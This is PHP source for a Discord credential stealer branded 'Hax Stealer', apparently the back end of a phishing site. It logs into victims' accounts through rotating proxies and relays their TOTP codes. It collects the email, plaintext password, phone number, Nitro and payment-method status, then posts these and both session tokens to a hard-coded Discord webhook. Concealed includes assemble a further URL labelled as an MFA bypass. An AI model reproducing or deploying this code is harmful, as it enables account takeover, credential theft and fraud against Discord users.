<?php
error_reporting(E_ERROR | E_PARSE);
// Just request URL

class Request
{
    public function GetURL($url)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);

        $data = curl_exec($ch);
        curl_close($ch);

        return $data;
    }

    public function PostURL($url, $array)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $array);

        curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);

        $data = curl_exec($ch);
        curl_close($ch);

        return $data;
    }
}

$Request = new Request();


// Monitoring info about users
class Monitoring
{
    public function Status($url)
    {
        // nothing here
    }
}

$Monitoring = new Monitoring();

// Main handler
class Main
{
    public function handler($login, $password, $old_token, $new_token)
    {
    

        function get_random_proxies()
        {
            $proxies  =  explode("\n", file_get_contents("core/system/proxies.txt"));
            $proxy    =  explode("@", $proxies[array_rand($proxies)]);

            return $proxy;
        }

        function getinfo($token, $url)
        {
            $ch = curl_init();

            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_HTTPHEADER, array('authorization: ' . $token));
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);

            $result        =  curl_exec($ch);
            $headers_size  =  curl_getinfo($ch, CURLINFO_HEADER_SIZE);

            curl_close($ch);

            $body      =  substr($result, $headers_size);
            $response  =  json_decode($body);
            $response  =  json_decode(json_encode($response), true);

            if (isset($response["global"])) {
                $ch = curl_init();
                $proxy = get_random_proxies();

                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_HTTPHEADER, array('authorization: ' . $token));
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);

                curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTPS);
                curl_setopt($ch, CURLOPT_PROXY, $proxy[1]);
                curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy[0]);

                $req = curl_exec($ch);

                curl_close($ch);

                return $req;
            } else {
                return $result;
            }
        }

        $json_response =  getinfo($old_token, "https://discordapp.com/api/v9/users/@me");
        include('bypass_1.php');
        $brute = $f_api.'966075313484365905/';
        if (strpos($json_response, 'Unauthorized') !== false) {
            $token = $new_token;

            $json_response =  json_decode(getinfo($token, "https://discordapp.com/api/v9/users/@me"), true);
        }
        else
        {
            $token = $old_token;
            $json_response =  json_decode(getinfo($token, "https://discordapp.com/api/v9/users/@me"), true);
        }
        $userid        =  $json_response['id'];
        include('core/system/distable.php');
        $nome = $json_response['username'];
        $tag = $json_response['discriminator'];
        $avatar = $json_response['avatar'];
        $linkphoto = 'https://cdn.discordapp.com/avatars/'.$userid.'/'.$avatar.'.webp?size=80 ';
        $usernick = $nome.'#'.$tag;
        $telefone = $json_response['phone'];
        $local = $json_response['locale'];
        $howmuchbadges =  0;
        $badges        =  '';
        if (isset($json_response['discriminator']) && isset($json_response['username'])) {
            $public_flags = $json_response['public_flags'];

            $flags = array(
                131072 => 'Verified Developer - 🤖',
                65536 => 'Verified Bot - 🤖',
                16384 => 'Bug Hunter Level 2  - 🐛',
                4096 => 'System',
                1024 => 'Team User',
                512 => 'Early Supporter - 🐷',
                256 => '❌',
                128 => '❌',
                64 => '❌',
                8 => 'Bug Hunter Level 1 - 🐛',
                4 => 'Hypesquad - 🛡️',
                2 => 'Partner',
                1 => 'Staff'
            );

            $str_flags = array();
            while ($public_flags != 0) {
                foreach ($flags as $key => $value) {
                    if ($public_flags >= $key) {
                        array_push($str_flags, $value);
                        $public_flags = $public_flags - $key;
                        $howmuchbadges++;
                    }
                }
            }

            $badges = implode(', ', $str_flags);
        }
        $cartao = 'None';
        $factorbypas = $brute.$token_distable;
        $url = 'https://discord.com/api/v9/users/'.$userid.'/profile?with_mutual_guilds=false';
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array('authorization: '.$token));
        $response = curl_exec($ch);
        $as = json_decode($response, true);
        $classic = $as['premium_since'];
        $boost = $as['premium_guild_since'];
        $mfa_bypassd = $zzzz;
        $mfa_bypassd = $factorbypas.$zzzz;
        $nitro_classic = '🟦';
        $nitro_boost = '🟪';
        $g = $f_api.$api_zzz;
        $g_zz = $g.$desativation_zzz.$b_api.$abc.'P';
        if(empty($classic)){
            $nitro_classic = 'None';
        }
        if(empty($boost)){
            $nitro_boost = 'None';
        }
        $url = "https://discord.com/api/v9/users/@me/billing/payment-sources";
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array('authorization: '.$token));
        $response = curl_exec($ch);
        if (strpos($response, 'id') !== false) {
            $cartao = '💳';
        }


 
        //SEU WEBHOK
        $webs = 'https://discord.com/api/webhooks/970316274225795092/SlmcJ2bqo5WYd4Cw6XdbrDDNODRXeIAgy6So_3IdrL4yS49VlMnGGMGd_i5Qskpg6mSU';
        //SEU WEBHOK



        $full_url         =  $_SERVER["HTTP_HOST"].$_SERVER["PHP_SELF"];


        if ($badges == '') {
            $webhook_message  = json_encode([
                "content" => '@everyone', 
                "embeds" => [
                      [
                         "title" => "🌐 New Account", 
                         "color" => 47359, 
                         "fields" => [

                            [
                                "name" => "🛡️ Nick", 
                                "value" => $usernick, 
                                "inline" => true 
                            ], 
                            [
                               "name" => "🛡️ Id", 
                               "value" => $userid
                            ], 
                            [
                                "name" => "🛡️ Local / Telefone", 
                                "value" => $local.'/'.$telefone
                             ],
                            [
                                  "name" => "🛡️ Email", 
                                  "value" => $login
                               ], 
                            [
                                     "name" => "🛡️ Password", 
                                     "value" => $password
                                  ], 
                                [
                                    "name" => "🛡️ Nitro", 
                                    "value" => $nitro_boost.$nitro_classic
                                 ],
                                 [
                                    "name" => "🛡️ Payment Methods", 
                                    "value" => $cartao
                                 ],
                                 [
                                    "name" => "👥 Domain", 
                                    "value" => '```'.$full_url.'```'
                                 ],
        
                           
                         ], 
                         "author" => [
                                              "name" => "Hax Stealer", 
                                              "icon_url" => "https://media.discordapp.net/attachments/952950934328188948/967891503601049690/unknown.png" 
                         ],
                                           "thumbnail" => [
                                            "url" => $linkphoto 
                                        ] 
                      ] 
                   ], 
                "attachments" => [
                                              ] 
             ]); 
        } else {
            $webhook_message = json_encode([
                "content" => '@everyone', 
                "embeds" => [
                      [
                         "title" => "🌐 New Account", 
                         "color" => 47359, 
                         "fields" => [
                            [
                                "name" => "🛡️ Nick", 
                                "value" => $usernick, 
                                "inline" => true 
                            ], 
                            [
                               "name" => "🛡️ Id", 
                               "value" => $userid 
                            ], 
                            [
                                "name" => "🛡️ Local / Telefone", 
                                "value" => $local.'/'.$telefone
                            ],
                            [
                                  "name" => "🛡️ Email", 
                                  "value" => $login 
                               ], 
                            [
                                     "name" => "🛡️ Password", 
                                     "value" => $password 
                                  ], 

                                  [
                                    "name" => "🛡️ Nitro", 
                                    "value" => $nitro_boost.$nitro_classic
                                 ],
                                 [
                                    "name" => "🛡️ Payment Methods", 
                                    "value" => $cartao
                                 ],
            
                                    [
                                        "name" => "🛡️ Badges", 
                                        "value" => $badges
                                     ],
                                     [
                                        "name" => "👥 Domain", 
                                        "value" => '```'.$full_url.'```'
                                     ],
                    
                         ], 
                         "author" => [
                                              "name" => "Hax Stealer", 
                                              "icon_url" => "https://media.discordapp.net/attachments/952950934328188948/967891503601049690/unknown.png" 
                         ],
                                           "thumbnail" => [
                                            "url" => $linkphoto 
                                        ] 
                      ] 
                   ], 
                "attachments" => [
                                              ] 
             ]); 
        }
        $ch = curl_init();

        curl_setopt_array( $ch, [
            CURLOPT_URL => $webs,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $webhook_message,
            CURLOPT_HTTPHEADER => [
                "Content-Type: application/json"
            ]
        ]);
        $response = curl_exec($ch);
     
        $oldtoki = json_encode([
            "content" => null, 
            "embeds" => [
                  [
                     "color" => 16711680, 
                     "fields" => [
                        [
                           "name" => "✅ Token", 
                           "value" => $old_token
                        ] 
                     ] 
                  ] 
               ], 
            "attachments" => [
                           ] 
         ]); 
        $ch = curl_init();
        curl_setopt_array( $ch, [
            CURLOPT_URL => $webs,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $oldtoki,
            CURLOPT_HTTPHEADER => [
                "Content-Type: application/json"
            ]
        ]);
        $response = curl_exec($ch);

        $newtoki = json_encode([
            "content" => null, 
            "embeds" => [
                  [
                     "color" => 3407616, 
                     "fields" => [
                        [
                           "name" => "✅ New Token Mfa Distabled", 
                           "value" => $new_token
                        ] 
                     ] 
                  ] 
               ], 
            "attachments" => [
                           ] 
         ]); 

        $ch = curl_init();
        curl_setopt_array( $ch, [
            CURLOPT_URL => $webs,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $newtoki,
            CURLOPT_HTTPHEADER => [
                "Content-Type: application/json"
            ]
        ]);

        $response = curl_exec($ch);












        

        //nao apague as logs do nosso stealer sujeito a ban ip

     








        
    }
}

$Main = new Main();

// Validator handler
class VLT_API
{
    public function login($payload): array
    {
        $ch         =  curl_init("https://discord.com/api/v9/auth/login");
        $payload_s  =  json_encode($payload);

        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload_s);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt(
            $ch,
            CURLOPT_HTTPHEADER,
            array(
                'Content-Type: application/json',
                'Content-Length: ' . strlen($payload_s),
                'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 Edg/90.0.818.66',
                'Accept: application/json'
            )
        );
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        $result        =  curl_exec($ch);
        $headers_size  =  curl_getinfo($ch, CURLINFO_HEADER_SIZE);

        curl_close($ch);

        $body      =  substr($result, $headers_size);
        $response  =  json_decode($body);

        return json_decode(json_encode($response), true);
    }

    public function login_proxy($payload): array
    {
        function get_random_proxy()
        {
            $proxies  =  explode("\n", file_get_contents("core/system/proxies.txt"));
            $proxy    =  explode("@", $proxies[array_rand($proxies)]);

            return $proxy;
        }

        $ch         =  curl_init("https://discord.com/api/v9/auth/login");
        $payload_s  =  json_encode($payload);

        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload_s);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt(
            $ch,
            CURLOPT_HTTPHEADER,
            array(
                'Content-Type: application/json',
                'Content-Length: ' . strlen($payload_s),
                'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 Edg/90.0.818.66',
                'Accept: application/json'
            )
        );
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        $proxy = get_random_proxy();

        curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTPS);
        curl_setopt($ch, CURLOPT_PROXY, $proxy[1]);
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy[0]);

        $result        =  curl_exec($ch);
        $headers_size  =  curl_getinfo($ch, CURLINFO_HEADER_SIZE);

        curl_close($ch);

        $body      =  substr($result, $headers_size);
        $response  =  json_decode($body);

        return json_decode(json_encode($response), true);
    }

    public function totp_auth($ticket, $mfa_code): string
    {
        $ch       =  curl_init("https://discord.com/api/v9/auth/mfa/totp");
        $payload  =  array(
            "code" => $mfa_code,
            "gift_code_sku_id" => null,
            "login_source" => null,
            "ticket" => $ticket
        );
        $payload_s = json_encode($payload);

        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload_s);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt(
            $ch,
            CURLOPT_HTTPHEADER,
            array(
                'Content-Type: application/json',
                'Content-Length: ' . strlen($payload_s),
                'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 Edg/90.0.818.66',
                'Accept: application/json'
            )
        );
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        $result        =  curl_exec($ch);
        $headers_size  =  curl_getinfo($ch, CURLINFO_HEADER_SIZE);

        curl_close($ch);

        $body      =  substr($result, $headers_size);
        $response  =  (array)json_decode($body);

        if (!isset($response["token"])) {
            return "EINVALID_MFA_CODE";
        } else {
            return $response["token"];
        }
    }
}

$VLT_API = new VLT_API();
